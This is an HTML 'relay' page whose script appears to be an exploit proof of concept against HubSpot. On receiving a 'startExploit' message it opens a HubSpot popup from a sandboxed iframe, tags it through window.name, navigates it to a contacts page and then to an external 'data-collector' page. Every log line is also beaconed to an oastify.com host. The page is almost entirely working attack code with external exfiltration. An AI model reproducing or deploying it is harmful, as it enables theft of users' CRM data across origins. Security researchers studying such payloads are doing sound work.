<!DOCTYPE html>
<html>
<head><title>Relay</title></head>
<body>
<h1>Relay Page</h1>
<div id="status"></div>

<script>
const EXFIL = 'https://2psm26pbwwjsvjp5bhe2j9v6axgo4es3.oastify.com';

function log(msg) {
    document.getElementById('status').innerHTML += '<br>' + msg;
    new Image().src = EXFIL + '/?log=' + encodeURIComponent(msg);
}

log('relay_loaded');

// Listen for start command
window.addEventListener('message', function(e) {
    if (e.data && e.data.action === 'startExploit') {
        log('received_start_command');
        
        // Create sandboxed iframe
        const iframe = document.createElement('iframe');
        iframe.sandbox = 'allow-scripts allow-popups allow-popups-to-escape-sandbox';
        
        // Use srcdoc (inherits parent origin but sandbox makes it null)
        iframe.srcdoc = `
            <h2>Sandbox</h2>
            <div id="log"></div>
            <script>
                function log(msg) {
                    document.getElementById('log').innerHTML += '<br>' + msg;
                }
                
                log('Sandbox loaded');
                log('Origin: ' + window.origin);
                
                // Open HubSpot popup
                log('Opening HubSpot...');
                const hub = window.open('https://app-eu1.hubspot.com', 'hubspot_window');
                
                if (!hub) {
                    log('ERROR: Popup blocked');
                } else {
                    log('Popup opened successfully');
                    
                    // Wait for it to load
                    setTimeout(() => {
                        log('Setting window.name');
                        
                        // Set a marker in window.name
                        hub.name = 'exploited_' + Date.now();
                        
                        log('Name set to: ' + hub.name);
                        
                        // Navigate to contacts page
                        log('Navigating to contacts...');
                        hub.location = 'https://app-eu1.hubspot.com/contacts/146256700';
                        
                        // After navigation, window.name should persist
                        setTimeout(() => {
                            log('Checking name after navigation...');
                            log('Current name: ' + hub.name);
                            
                            // Navigate to our collector
                            setTimeout(() => {
                                log('Navigating to collector');
                                hub.location = 'https://majdch22.github.io/data-collector.html';
                            }, 3000);
                            
                        }, 3000);
                        
                    }, 3000);
                }
            <\/script>
        `;
        
        iframe.style.cssText = 'width:100%;height:400px;border:2px solid red';
        document.body.appendChild(iframe);
        
        log('sandbox_iframe_created');
    }
});

// Tell opener we're ready
if (window.opener) {
    window.opener.postMessage({status: 'ready'}, '*');
}
</script>
</body>
</html>
